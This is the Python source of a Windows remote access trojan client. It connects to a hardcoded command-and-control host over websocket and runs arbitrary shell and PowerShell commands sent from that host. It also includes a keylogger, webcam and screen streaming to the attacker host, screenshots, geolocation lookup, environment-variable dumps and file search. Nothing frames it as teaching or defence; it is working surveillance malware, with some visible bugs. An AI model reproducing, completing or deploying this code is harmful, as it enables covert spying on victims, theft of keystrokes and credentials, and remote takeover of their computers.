import asyncio
import base64
import ctypes
import json
import os
import platform
import subprocess
import urllib.request
from datetime import datetime
from io import BytesIO
from pprint import pprint
from subprocess import STDOUT, check_output
import chardet
import pyautogui
import websockets
import cv2
import tempfile
from PIL import Image
import webbrowser
from threading import Thread
import commands
from pynput.keyboard import Listener
import glob
from vidstream import CameraClient
from vidstream import ScreenShareClient

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')
# Convert Image to Base64
def im_2_b64(image):
    buff = BytesIO()
    image.save(buff, format="JPEG")
    img_str = base64.b64encode(buff.getvalue())
    return img_str.decode("ascii")

def keylogger():
    global running_keylogger
    global keylogger_file
    global pressed_keys_map
    def on_press(key):
        if running_keylogger == True:
            if not key in pressed_keys_map or not pressed_keys_map[key]:
                pressed_keys_map[key]=True
                try:
                    with open(keylogger_file, 'a') as f:
                        now = datetime.now()  # current date and time
                        f.write(f'{now.strftime("%d.%G.%d %H:%M:%S:%f")} \t {key}\n')
                        f.close()
                except:
                    pass
    def on_release(key):
        if running_keylogger == True:
            pressed_keys_map[key]=False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

async def client():
    # print("Start Test")
    global running_keylogger
    global running_webcam
    global running_screenshare
    global keylogger_file
    try:
        print("Trying to connect...")
        async with websockets.connect('ws://192.0.2.66:31337') as websocket:
            timestamp = str(datetime.now())
            print(f"Sending hello timestamp {timestamp}")
            await websocket.send(timestamp)

            # Receive Configuration
            try:
                config_store_json = await websocket.recv()
            except:
                return
            config_store=json.loads(config_store_json)
            pprint(config_store)
            for k in config_store:
                print(f'{k}: {config_store[k]}')

            while True:
                command_json = await websocket.recv()

                command = json.loads(command_json)
                request = command[0]
                args = command[1]

                print(f"Command to execute: {request}")
                print(f"Command to execute: {str(args)}")

                status = "OK"
                output_type = "TEXT"
                output = []

                # Powershell command
                if request in commands.ps:
                    try:
                        # execut powershell as subprocess so that the websocket communication
                        # will not time out for long requests
                        proc = await asyncio.create_subprocess_exec(
                            "powershell.exe", commands.ps[request],
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE
                        )
                        # if proc takes very long to complete, the CPUs are free to use cycles for
                        # other processes
                        stdout, stderr = await asyncio.wait_for(proc.communicate(), 5)
                        encoding = chardet.detect(stdout)['encoding']
                        output.append(stdout.decode(encoding, 'ignore'))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))

                # Shell command
                elif request in commands.cmd:
                    try:
                        # execut powershell as subprocess so that the websocket communication
                        # will not time out for long requests

                        proc = await asyncio.create_subprocess_exec(
                            "cmd.exe","/C", commands.cmd[request],
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE)

                        # if proc takes very long to complete, the CPUs are free to use cycles for
                        # other processes
                        stdout, stderr = await asyncio.wait_for(proc.communicate(), 5)
                        encoding = chardet.detect(stdout)['encoding']
                        output.append(stdout.decode(encoding, 'ignore'))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == 'SHELL':
                    # Send command and arguments to shell
                    try:
                        ret = check_output(args, stderr=STDOUT, timeout=500, shell=True)
                        the_encoding = chardet.detect(ret)['encoding']
                        output.append(ret.decode(the_encoding, 'ignore'))
                    except subprocess.CalledProcessError as e:
                        status = "WARNING"
                        output.append(str(e.returncode))
                        the_encoding = chardet.detect(e.output)['encoding']
                        output.append(str(e.output.decode(the_encoding, 'ignore')))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_TIME":
                    # Get local time at client
                    try:
                        now = datetime.now()  # current date and time
                        output.append(now.strftime("%A %d.%G.%d %H:%M:%S:%f"))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))

                elif request == "GET_LOCATION":
                    # Get geolocation and
                    try:
                        # with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                        with urllib.request.urlopen("http://ip-api.com/json/") as url:
                            data = json.loads(url.read().decode())

                        for key in data:
                            output.append(f"{key}: {data[key]}")
                        output.append(f"http://www.google.com/maps/place/{data['lat']},{data['lon']}")
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_CPU":
                    # get number of used monitors
                    try:
                        count = os.cpu_count()
                        output.append(f'Number of CPUs: {count}')
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_PID":
                    # get current PID
                    try:
                        count = os.getpid()
                        output.append(f'Current PID: {count}')
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_LOGIN":
                    # get current user
                    try:
                        count = os.getlogin()
                        output.append(f'Current Login: {count}')
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_ENV":
                    # get ENVIRONMENT
                    try:
                        for k in os.environ:
                            output.append(f'{k} {os.getenv(k)}')
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == 'GET_DRIVES':
                    # list all availible drive letters
                    try:
                        drives = []
                        bitmask = kernel32.GetLogicalDrives()
                        letter = ord('A')
                        while bitmask > 0:
                            if bitmask & 1:
                                output.append(chr(letter) + ':\\')
                            bitmask >>= 1
                            letter += 1
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "OPEN_URL":
                    try:
                        webbrowser.open_new_tab(args[0])
                        output.append(str("Sent open to lokal browser."))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "WEBCAM":
                    try:

                        if args[0] == "STREAM":
                            if not running_webcam:
                                webcam = CameraClient("192.0.2.66", 31338)
                                webcam.start_stream()
                                running_webcam = True
                                output.append(str("Streaming..."))
                            else:
                                status = "ERROR"
                                output.append(str("Streaming already started"))
                        elif args[0] == "STOP":
                            running_webcam=False
                            webcam.stop_stream()
                            output.append(str("Stop streaming..."))
                        elif args[0] == "SNAP":
                            if not running_webcam:
                                webcam_snap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                                return_value, cam_image = webcam_snap.read()
                                # convert from openCV2 to PIL. Notice the COLOR_BGR2RGB which means that
                                # the color is converted from BGR to RGB
                                image = Image.fromarray(cv2.cvtColor(webcam_snap, cv2.COLOR_BGR2RGB))
                                webcam_snap.release()
                                output.append(im_2_b64(image))
                                output_type = "IMAGE"
                            else:
                                status = "ERROR"
                                output.append(str("Can't make snapshot while streaming"))
                        elif args[0] == "STATUS":
                                output.append(f"Webcam is streaming: {running_webcam}")
                        else:
                            status = "ERROR"
                            output.append(str("Unknown WEBCAM command"))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str(e))

                elif request == "SCREEN":
                    try:

                        if args[0] == "STREAM":
                            if not running_screenshare:
                                screencam = ScreenShareClient("192.0.2.66", 31339)
                                screencam.start_stream()
                                running_screenshare = True
                                output.append(str("Streaming..."))
                            else:
                                status = "ERROR"
                                output.append(str("Streaming already started"))
                        elif args[0] == "STOP":
                            running_screenshare=False
                            screencam.stop_stream()
                            output.append(str("Stop streaming..."))
                        elif args[0] == "SNAP":
                            image = pyautogui.screenshot()
                            tmp = im_2_b64(image)
                            output.append(tmp)
                            output_type = "IMAGE"
                        elif args[0] == "STATUS":
                                output.append(f"Screen is streaming: {running_screenshare}")
                        else:
                            status = "ERROR"
                            output.append(str("Unknown SCREEN command"))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str(e))


                elif request== "KEYLOGGER":
                    try:
                        if args[0].upper() == "START":
                            if not running_keylogger:
                                running_keylogger = True
                                try:
                                    with open(keylogger_file, 'w') as f:
                                        now = datetime.now()  # current date and time
                                        f.write("Started "+now.strftime("%d.%G.%d %H:%M:%S:%f:\n"))
                                        f.close()
                                    Thread(target=keylogger, daemon=True).start()
                                    output.append(str("Keylogger session is started"))
                                    output.append(str(keylogger_file))
                                except Exception as e:
                                    status = "ERROR"
                                    output.append(str("-1"))
                                    output.append(str(e))
                            else:
                                status = "WARNING"
                                output.append(str("Keylogger is already running!"))

                        elif args[0].upper() == "STOP":
                            running_keylogger = False
                            output.append(str("Keylogger session is stopped, you can still download the dump file!"))
                        elif args[0].upper() == "DUMP":
                            with open(keylogger_file, 'r') as f:
                                logging=f.readlines()
                                f.close()
                            for line in logging:
                                output.append(str(line))
                        elif args[0].upper() == "CLEAN":
                            try:
                                with open(keylogger_file, 'w') as f:
                                    now = datetime.now()  # current date and time
                                    f.write("Cleaned "+now.strftime("%d.%G.%d %H:%M:%S:%f:\n"))
                                    f.close()
                                output.append(str("Keylogger logfile cleaned"))
                                output.append(str(keylogger_file))
                            except Exception as e:
                                status = "ERROR"
                                output.append(str("-1"))
                                output.append(str(e))
                        else:
                            output.append(f"Unknown subcommand: {str(args[0])}")
                    except:
                        output.append(f"Keylogger is running: {str(running_keylogger)}")
                elif request== "FIND":
                    try:
                        try:
                            pattern=args[0]
                            for file in glob.glob(pattern, recursive=True):
                                output.append(str(file))
                        except Exception as e:
                            status = "ERROR"
                            output.append(str("-1"))
                            output.append(str(e))
                    except:
                        for file in glob.glob("*", recursive=True):
                            output.append(str(file))

                elif request == "CD":
                    try:
                        # try:
                        os.chdir(args[0])
                        # except:
                        #    pass
                        output.append(os.getcwd())
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == 'SYSINFO':
                    output.append(f'''System: {platform.platform()} {platform.win32_edition()}''')
                    output.append(f'''Architecture: {platform.architecture()}''')
                    output.append(f'''Name of Computer: {platform.node()}''')
                    output.append(f'''Processor: {platform.processor()}''')
                    output.append(f'''Python: {platform.python_version()}''')
                    output.append(f'''Java: {platform.java_ver()}''')
                    output.append(f'''User: {os.getlogin()}''')
                elif request == 'EXIT':
                    return
                    # exit(1)
                else:
                    request = f"Internal Error: Unknown command {request}"

                # pprint(output)
                # print(type(output))
                answer = []
                answer.append(status)
                answer.append(output_type)
                answer.append(output)
                answer_json = json.dumps(answer)
                # print(f'Command: {answer_json}')
                # pprint(answer_json)
                await websocket.send(answer_json)
                print("End of Command, waiting for next command")
    except Exception as e:
        print(f'Exception: {e}')

while True:
    # Prepar stuff for keylogger
    global pressed_keys_map
    global running_keylogger
    global keylogger_file
    global running_webcam
    global running_screenshare
    pressed_keys_map = {}
    running_keylogger=False
    running_webcam=False
    running_screenshare=False

    keylogger_file = tempfile.gettempdir() + "\logging.txt"

    asyncio.get_event_loop().run_until_complete(client())
